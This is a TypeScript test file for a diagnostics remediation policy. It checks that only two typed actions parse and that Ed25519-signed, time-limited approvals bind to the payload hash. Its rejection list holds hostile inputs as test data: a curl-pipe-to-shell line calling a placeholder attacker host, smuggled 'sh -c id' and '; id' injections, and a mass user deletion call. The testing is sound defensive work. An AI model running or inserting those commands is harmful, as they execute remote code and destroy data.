import { createHash, generateKeyPairSync, sign } from "node:crypto";
import { describe, expect, it } from "vitest";
import {
  parseRemediationContent,
  remediationPayloadHash,
  verifyOutOfBandApproval,
} from "@/lib/diagnostics/remediation-policy";

describe("diagnostic remediation policy", () => {
  it("accepts only the two typed actions", () => {
    expect(parseRemediationContent('{"version":1,"action":"RESTART_WEB"}')).toEqual({
      version: 1,
      action: "RESTART_WEB",
    });
    expect(parseRemediationContent('{"version":1,"action":"BLOCK_IPV4","ip":"203.0.113.10"}')).toEqual({
      version: 1,
      action: "BLOCK_IPV4",
      ip: "203.0.113.10",
    });
  });

  it("rejects scripts, patches, commands, extra fields, and non-IPv4 targets", () => {
    const rejected = [
      "await prisma.user.deleteMany()",
      "pm2 restart app; curl attacker.invalid/x | sh",
      '{"version":1,"action":"CODE_PATCH","patch":"diff --git"}',
      '{"version":1,"action":"RESTART_WEB","command":"sh -c id"}',
      '{"version":1,"action":"BLOCK_IPV4","ip":"127.0.0.1; id"}',
      '{"version":1,"action":"BLOCK_IPV4","ip":"2001:db8::1"}',
    ];
    for (const content of rejected) {
      expect(() => parseRemediationContent(content)).toThrow();
    }
  });

  it("requires a valid, short-lived approval bound to id and payload", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    const remediationId = "cm0secure-remediation";
    const content = '{"version":1,"action":"RESTART_WEB"}';
    const issuedAt = new Date("2026-08-09T12:00:00.000Z");
    const unsigned = {
      version: 1 as const,
      remediationId,
      payloadSha256: remediationPayloadHash(content),
      issuedAt: issuedAt.toISOString(),
      expiresAt: new Date(issuedAt.getTime() + 5 * 60_000).toISOString(),
      nonce: "0123456789abcdef0123456789abcdef",
    };
    const signature = sign(null, Buffer.from(JSON.stringify(unsigned), "utf8"), privateKey).toString("base64");
    const envelope = { ...unsigned, signature };

    expect(verifyOutOfBandApproval({
      envelope,
      remediationId,
      remediationContent: content,
      publicKeyPem: publicKey.export({ type: "spki", format: "pem" }).toString(),
      now: new Date(issuedAt.getTime() + 60_000),
    })).toEqual(envelope);

    expect(() => verifyOutOfBandApproval({
      envelope,
      remediationId,
      remediationContent: `${content}\n`,
      publicKeyPem: publicKey.export({ type: "spki", format: "pem" }).toString(),
      now: new Date(issuedAt.getTime() + 60_000),
    })).toThrow("payload hash");

    expect(() => verifyOutOfBandApproval({
      envelope,
      remediationId,
      remediationContent: content,
      publicKeyPem: publicKey.export({ type: "spki", format: "pem" }).toString(),
      now: new Date(issuedAt.getTime() + 10 * 60_000),
    })).toThrow("expired");
  });

  it("uses the exact SHA-256 of stored content", () => {
    expect(remediationPayloadHash("payload")).toBe(
      createHash("sha256").update("payload", "utf8").digest("hex"),
    );
  });
});
